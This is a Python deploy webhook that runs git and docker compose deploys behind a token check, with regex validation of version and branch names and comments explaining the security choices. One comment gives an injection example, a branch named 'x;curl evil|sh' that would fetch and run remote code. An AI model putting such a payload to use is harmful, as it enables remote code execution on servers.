#!/usr/bin/env python3
"""Splouch deploy webhook.

Listens on 0.0.0.0 so Docker bridge networks can reach it.
Authenticated endpoints:
  POST /deploy   — git pull + docker compose up -d --build
  GET  /versions — list available release tags
  GET  /log      — stream output of the last deploy

Setup:
  1. Copy deploy_webhook.service to /etc/systemd/system/
  2. Replace YOUR_INSTALL_DIR and YOUR_USER in the service file
  3. sudo systemctl daemon-reload && sudo systemctl enable --now deploy-webhook
"""
import hmac
import http.server
import json
import os
import re
import subprocess
import threading
import tomllib
from urllib.parse import urlparse, parse_qs

_VERSION_RE = re.compile(r'^v\d{4}\.\d{2}\.\d+$')
# Git branch names that are safe to put in a shell command: letters, digits and
# the handful of separators a branch actually uses. No spaces, quotes or metachars.
_REF_RE     = re.compile(r'^[A-Za-z0-9._/-]{1,100}$')

SECRET   = os.environ.get('DEPLOY_SECRET', '')
REPO     = os.path.expanduser(os.environ.get('REPO_DIR', '~/Splouch'))
PORT     = int(os.environ.get('DEPLOY_PORT', '9000'))
# Under the repo, not /tmp: the name is predictable and /tmp is world-writable, so
# any local account could pre-create it as a symlink and have this process — which
# opens it 'wb' on every deploy — truncate a file of their choosing.
LOG_FILE = os.path.join(REPO, 'cloud', '.deploy.log')


def _update_config():
    """Load the update-dropdown settings from update_config.toml at the repo root.

    Read fresh on each request. Returns (extra_branches, max_versions);
    max_versions == 0 means no limit.
    """
    try:
        with open(os.path.join(REPO, 'server', 'update_config.toml'), 'rb') as f:
            cfg = tomllib.load(f)
    except Exception:
        cfg = {}
    return (cfg.get('extra_branches') or [], int(cfg.get('max_versions') or 0))


def _run_deploy(cmd):
    """Run the deploy command, stream output to LOG_FILE, self-restart when done."""
    log = open(LOG_FILE, 'wb', buffering=0)
    log.write(b'##START##\n')
    proc = subprocess.Popen(
        ['bash', '-c', cmd],
        stdout=log, stderr=subprocess.STDOUT,
        start_new_session=True,
    )

    def _wait():
        proc.wait()
        log.write(f'\n##DONE:{proc.returncode}##\n'.encode())
        log.flush()
        log.close()
        # Restart the webhook so the new deploy_webhook.py takes effect
        subprocess.Popen(['sudo', 'systemctl', 'restart', 'deploy-webhook'])

    threading.Thread(target=_wait, daemon=True).start()


class Handler(http.server.BaseHTTPRequestHandler):

    def do_POST(self):
        if self.path != '/deploy':
            self._reply(404, b'not found')
            return
        if not self._check_auth():
            return
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length) if length else b'{}'
        try:
            version = json.loads(body).get('version', 'latest')
        except Exception:
            version = 'latest'

        self._reply(200, b'deploy started')

        extra_refs, _ = _update_config()
        if version == 'master':
            cmd = f'cd {REPO} && git fetch origin && git reset --hard origin/master'
        elif version in extra_refs and _REF_RE.match(version):
            # Branch deploy: force the working tree to origin/<branch>. The
            # allowlist is read from update_config.toml, a *tracked* file that a
            # deploy itself rewrites, so "it came from the allowlist" says nothing
            # about its shape — a branch named `x;curl evil|sh` would be a command,
            # not a ref. _REF_RE is what makes it safe to interpolate.
            cmd = f'cd {REPO} && git fetch origin && git reset --hard origin/{version}'
        elif _VERSION_RE.match(version):
            # A specific release tag. `version` is validated against _VERSION_RE,
            # so it is safe to interpolate into the shell command.
            cmd = f'cd {REPO} && git fetch --tags && git checkout -B release {version}'
        else:
            # 'latest' (or anything unrecognised) → newest release tag.
            cmd = (
                f'cd {REPO} && git fetch --tags && '
                f'LATEST=$(git tag -l --sort=-version:refname | grep -E \'^v[0-9]{{4}}\\.[0-9]{{2}}\\.[0-9]+$\' | head -1) && '
                f'if [ -n "$LATEST" ]; then git checkout -B release "$LATEST"; else git fetch origin && git reset --hard origin/master; fi'
            )
        cmd += f' && cd {REPO}/cloud && docker compose up -d --build'

        _run_deploy(cmd)

    def do_GET(self):
        path = urlparse(self.path).path
        if path == '/versions':
            self._handle_versions()
        elif path == '/log':
            self._handle_log()
        elif path == '/logs':
            self._handle_logs()
        else:
            self._reply(404, b'not found')

    def _handle_versions(self):
        if not self._check_auth():
            return
        try:
            cur = subprocess.run(
                ['git', '-C', REPO, 'describe', '--tags', '--exact-match', 'HEAD'],
                capture_output=True, text=True, timeout=8)
            current = cur.stdout.strip() if cur.returncode == 0 else ''
            subprocess.run(['git', '-C', REPO, 'fetch', '--tags'],
                           capture_output=True, timeout=20)
            tags_r = subprocess.run(
                ['git', '-C', REPO, 'tag', '-l', '--sort=-version:refname'],
                capture_output=True, text=True, timeout=8)
            extra_refs, max_versions = _update_config()
            tags = [t.strip() for t in tags_r.stdout.splitlines()
                    if t.strip() and _VERSION_RE.match(t.strip())]
            if max_versions > 0:
                tags = tags[:max_versions]
            branches = []
            for ref in extra_refs:
                chk = subprocess.run(
                    ['git', '-C', REPO, 'rev-parse', '--verify', '--quiet',
                     f'refs/remotes/origin/{ref}'],
                    capture_output=True, timeout=8)
                if chk.returncode == 0:
                    branches.append(ref)
            body = json.dumps({'ok': True, 'current': current,
                               'versions': tags, 'branches': branches}).encode()
            self._reply(200, body, 'application/json')
        except Exception as e:
            body = json.dumps({'ok': False, 'error': str(e)}).encode()
            self._reply(500, body, 'application/json')

    def _handle_log(self):
        if not self._check_auth():
            return
        try:
            with open(LOG_FILE, 'rb') as f:
                content = f.read().decode('utf-8', errors='replace')
        except FileNotFoundError:
            content = ''

        lines = []
        done  = None
        for line in content.splitlines():
            if line == '##START##':
                continue
            m = re.match(r'^##DONE:(-?\d+)##$', line.strip())
            if m:
                done = (int(m.group(1)) == 0)
            else:
                lines.append(line)

        body = json.dumps({'lines': lines, 'done': done}).encode()
        self._reply(200, body, 'application/json')

    def _handle_logs(self):
        if not self._check_auth():
            return
        params = parse_qs(urlparse(self.path).query)
        source = params.get('source', ['app'])[0]
        # Clamped both ways, and non-numeric input falls back rather than raising:
        # this runs outside the try below, so a bad value used to take the whole
        # handler down with an unhandled ValueError. A negative would also reach
        # `--tail -5`, which docker reads as an option.
        try:
            tail = min(max(int(params.get('tail', ['300'])[0]), 1), 1000)
        except (TypeError, ValueError):
            tail = 300
        tail = str(tail)
        compose = f'{REPO}/cloud/docker-compose.yml'

        cmds = {
            'app':     ['docker', 'compose', '-f', compose, 'logs', '--tail', tail, '--no-color', 'app'],
            'caddy':   ['docker', 'compose', '-f', compose, 'logs', '--tail', tail, '--no-color', 'caddy'],
            'webhook': ['journalctl', '-u', 'deploy-webhook', '-n', tail, '--no-pager', '--output=short'],
        }
        if source not in cmds:
            self._reply(400, b'unknown source')
            return
        try:
            r = subprocess.run(cmds[source], capture_output=True, text=True, timeout=15)
            output = r.stdout + (r.stderr if r.stderr and not r.stdout else '')
            body = json.dumps({'ok': True, 'lines': output.splitlines()}).encode()
            self._reply(200, body, 'application/json')
        except Exception as e:
            body = json.dumps({'ok': False, 'error': str(e)}).encode()
            self._reply(500, body, 'application/json')

    def _check_auth(self):
        if not SECRET:
            self._reply(500, b'DEPLOY_SECRET not set')
            return False
        token = self.headers.get('X-Deploy-Token', '')
        if not hmac.compare_digest(token.encode(), SECRET.encode()):
            self._reply(403, b'forbidden')
            return False
        return True

    def _reply(self, code, body, content_type='text/plain'):
        self.send_response(code)
        self.send_header('Content-Type', content_type)
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        print(fmt % args, flush=True)


if __name__ == '__main__':
    if not SECRET:
        print('WARNING: DEPLOY_SECRET not set — all requests will be rejected', flush=True)
    # The systemd unit names an absolute path (install.sh substitutes it), so a moved or
    # renamed checkout leaves REPO pointing at nothing. Usually the unit fails to start
    # first and this never runs; it catches the half-repaired case, where the service
    # file was fixed but REPO_DIR was not, and every deploy would fail deep in git.
    if not os.path.isdir(os.path.join(REPO, '.git')):
        print(f'WARNING: REPO_DIR={REPO} is not a git checkout — deploys will fail. '
              'Fix REPO_DIR in /etc/systemd/system/deploy-webhook.service, or re-run '
              'install.sh, which rewrites the unit for the current directory.',
              flush=True)
    server = http.server.HTTPServer(('0.0.0.0', PORT), Handler)
    print(f'deploy webhook listening on 0.0.0.0:{PORT}  repo={REPO}', flush=True)
    server.serve_forever()
